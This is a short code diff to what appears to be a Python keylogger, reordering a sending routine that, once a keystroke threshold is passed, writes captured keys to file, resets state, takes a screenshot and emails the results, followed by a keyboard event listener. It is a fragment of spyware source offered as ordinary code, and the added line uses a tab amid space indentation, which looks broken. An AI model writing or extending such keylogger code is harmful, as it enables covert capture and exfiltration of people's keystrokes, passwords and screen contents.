@@ -173,10 +173,10 @@ def initialize():
 def sending_procedure():
     if len(Keylogger.i) > Keylogger.MAX_KEYSTROKES:
         writeToFile()
+	initialize()
         take_screenshot()
         send_Email()
-        initialize()
-
+        
 #Keystrokes listener
 def OnKeyboardEvent(event):
     KeyFilters(event)
